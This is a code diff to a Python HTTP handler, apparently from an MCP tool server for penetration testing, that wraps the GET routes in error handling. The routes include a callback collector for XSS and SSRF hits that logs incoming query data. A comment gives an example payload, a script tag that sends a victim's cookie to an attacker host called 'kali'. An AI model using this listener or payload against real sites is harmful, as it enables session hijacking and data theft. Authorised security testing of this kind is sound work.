@@ -1819,47 +1819,50 @@ class MCPHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         path = urlparse(self.path).path
-        if path in ("/", "/tools"):
-            tools_list = [
-                {"name": k, "description": v["description"], "inputSchema": v["input_schema"]}
-                for k, v in TOOLS.items()
-            ]
-            body = json.dumps({"tools": tools_list}).encode()
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self._cors()
-            self.end_headers()
-            self.wfile.write(body)
-        elif path == "/ping":
-            self.send_response(200)
-            self._cors()
-            self.end_headers()
-            self.wfile.write(b"pong")
-        elif path == "/callbacks":
-            body = json.dumps(_CALLBACKS[-100:]).encode()
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self._cors()
-            self.end_headers()
-            self.wfile.write(body)
-        elif path.startswith("/cb") or path.startswith("/xss") or path.startswith("/ssrf"):
-            # XSS/SSRF GET callback (e.g. <script src=http://kali:3000/cb?c=COOKIE>)
-            qs = parse_qs(urlparse(self.path).query)
-            entry = {
-                "time": __import__('datetime').datetime.now().isoformat(),
-                "ip":   self.client_address[0],
-                "path": path,
-                "data": {k: v[0] for k, v in qs.items()},
-            }
-            _CALLBACKS.append(entry)
-            print(f"  [CALLBACK] {entry}")
-            self.send_response(200)
-            self._cors()
-            self.end_headers()
-            self.wfile.write(b"")
-        else:
-            self.send_response(404)
-            self.end_headers()
+        try:
+            if path in ("/", "/tools"):
+                tools_list = [
+                    {"name": k, "description": v["description"], "inputSchema": v["input_schema"]}
+                    for k, v in TOOLS.items()
+                ]
+                body = json.dumps({"tools": tools_list}).encode()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self._cors()
+                self.end_headers()
+                self.wfile.write(body)
+            elif path == "/ping":
+                self.send_response(200)
+                self._cors()
+                self.end_headers()
+                self.wfile.write(b"pong")
+            elif path == "/callbacks":
+                body = json.dumps(_CALLBACKS[-100:]).encode()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self._cors()
+                self.end_headers()
+                self.wfile.write(body)
+            elif path.startswith("/cb") or path.startswith("/xss") or path.startswith("/ssrf"):
+                # XSS/SSRF GET callback (e.g. <script src=http://kali:3000/cb?c=COOKIE>)
+                qs = parse_qs(urlparse(self.path).query)
+                entry = {
+                    "time": __import__('datetime').datetime.now().isoformat(),
+                    "ip":   self.client_address[0],
+                    "path": path,
+                    "data": {k: v[0] for k, v in qs.items()},
+                }
+                _CALLBACKS.append(entry)
+                print(f"  [CALLBACK] {entry}")
+                self.send_response(200)
+                self._cors()
+                self.end_headers()
+                self.wfile.write(b"")
+            else:
+                self.send_response(404)
+                self.end_headers()
+        except (BrokenPipeError, ConnectionResetError):
+            pass
 
     def do_POST(self):
         path = urlparse(self.path).path
